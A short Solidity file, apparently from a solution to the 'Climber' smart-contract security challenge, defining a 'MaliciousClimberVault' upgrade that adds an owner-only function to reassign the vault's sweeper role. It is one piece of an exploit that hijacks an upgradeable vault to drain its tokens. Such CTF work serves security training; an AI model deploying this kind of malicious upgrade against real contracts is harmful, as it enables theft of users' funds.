pragma solidity >=0.8;

import "../../climber/ClimberVault.sol";

contract MaliciousClimberVault is ClimberVault {
    function setSweeper(address newSweeper) external onlyOwner {
        _setSweeper(newSweeper);
    }
}